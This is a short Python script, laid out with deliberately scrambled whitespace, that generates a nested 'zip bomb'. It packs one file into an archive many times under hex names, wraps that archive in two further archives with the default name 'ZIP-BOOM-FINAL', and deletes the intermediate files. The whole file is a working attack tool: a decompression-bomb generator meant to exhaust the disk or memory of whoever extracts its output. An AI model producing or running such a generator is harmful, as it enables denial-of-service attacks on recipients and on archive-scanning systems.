import os,zipfile,sys
n, name, typ = (
int(sys.argv[sys.argv.
                index
    ('--file-size')
+ 1]),
sys.argv[sys.argv.index

('--name') + 1]
      if
   '--name'
      in
sys.argv else

'ZIP-BOOM-FINAL',
sys.        argv[
sys.        argv.
index('--type') +
1]
if
'--type'
in
sys.

argv else '7z')
z =        (zipfile
.           ZipFile
(f'0.{typ}',
 'w' ,     zipfile
.          ZIP_DEFLATED
))##########

for i in range(n):
    z.write('00.7z',
    arcname=f'{str(hex(i))[2:]}.{typ}')
    print                   ('RETURN:',
    i,                        'DONE')
z   .                         close()
b, a = (zipfile.ZipFile(f'1.{typ}',

       'w', zipfile.ZIP_DEFLATED),
        zipfile.          ZipFile
(f'{name}.{typ}'          , 'w',
         zipfile.ZIP_DEFLATED))

_=             b.write          (f'0.{typ}')
_=     b.close();     a.write       (f'1.{typ}')
_=  a.close();      os.remove         (f'1.{typ}')
_=  os.             remove                (f'0.{typ}')

print('DONE')
